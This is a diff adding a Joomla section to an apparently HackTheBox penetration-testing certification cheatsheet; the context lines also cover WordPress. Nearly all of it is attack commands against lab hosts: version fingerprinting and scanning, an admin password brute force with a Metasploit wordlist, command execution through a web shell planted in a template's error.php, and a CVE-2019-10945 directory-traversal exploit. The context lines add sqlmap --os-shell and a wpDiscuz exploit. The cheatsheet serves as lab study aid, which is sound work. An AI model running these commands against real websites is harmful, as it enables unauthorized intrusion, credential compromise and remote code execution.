@@ -77,6 +77,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Attacking Common Applications](#attacking-common-applications)
   	- [Application Enumeration](#application-enumeration)
   	- [WordPress](#WordPress)
+  	- [Joomla](#joomla)
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
@@ -1949,6 +1950,25 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 - Vulnerable Plugins - wpDiscuz
 	--> python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 - curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+```
+### Joomla
+```
+--> curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
+--> curl -s http://dev.inlanefreight.local/ | grep Joomla
+--> curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+--> curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+--> sudo pip3 install droopescan
+	--> droopescan scan joomla --url http://dev.inlanefreight.local/
+
+-->  python2 -m pip install bs4
+	--> python2 joomlascan.py -u http://dev.inlanefreight.local
+	--> sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+--> 
+	--> curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+--> CVE-2019-10945
+	--> https://github.com/dpgg101/CVE-2019-10945
+	--> python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+
 ```
 ### Splunk
 ```
